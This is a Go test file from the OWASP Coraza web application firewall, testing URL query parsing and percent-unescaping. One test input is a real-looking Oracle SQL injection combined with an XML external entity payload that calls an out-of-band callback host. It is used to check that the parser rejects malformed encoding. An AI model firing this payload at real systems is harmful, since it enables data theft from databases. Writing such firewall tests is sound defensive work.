// Copyright 2022 Juan Pablo Tosso and the OWASP Coraza contributors
// SPDX-License-Identifier: Apache-2.0

package url

import (
	"errors"
	"testing"
)

var parseQueryInput = `var=EmptyValue'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % awpsd SYSTEM "http://0cddnr5evws01h2bfzn5zd0cm3sxvrjv7oufi4.example'||'foo.bar/">%awpsd;`

func TestUrlPayloads(t *testing.T) {
	q, err := ParseQuery(parseQueryInput, '&')
	if !errors.Is(err, ErrInvalidURLEncoding) {
		t.Fatalf("expected ErrInvalidURLEncoding, got %v", err)
	}
	if len(q["var"]) == 0 {
		t.Error("var is empty")
	}
}

func BenchmarkParseQuery(b *testing.B) {
	for i := 0; i < b.N; i++ {
		_, _ = ParseQuery(parseQueryInput, '&')
	}
}

var queryUnescapePayloads = map[string]struct {
	value string
	err   error
}{
	"sample":    {"sample", nil},
	"s%20ample": {"s ample", nil},
	"s+ample":   {"s ample", nil},
	"s%2fample": {"s/ample", nil},
	"s% ample":  {"s% ample", ErrInvalidURLEncoding},
	"s%ssample": {"s%ssample", ErrInvalidURLEncoding},
	"s%00ample": {"s\x00ample", nil},
	"%7B%%7d":   {"{%}", ErrInvalidURLEncoding},
	"%7B+%+%7d": {"{ % }", ErrInvalidURLEncoding},
}

func TestQueryUnescape(t *testing.T) {
	for k, v := range queryUnescapePayloads {
		t.Run(k, func(t *testing.T) {
			if out, err := queryUnescape(k); out != v.value || !errors.Is(err, v.err) {
				t.Errorf("Error parsing %q, got %q and err=%v; expected %q and err=%v", k, out, err, v.value, v.err)
			}
		})
	}
}

func BenchmarkQueryUnescape(b *testing.B) {
	for i := 0; i < b.N; i++ {
		for k := range queryUnescapePayloads {
			_, _ = queryUnescape(k)
		}
	}
}
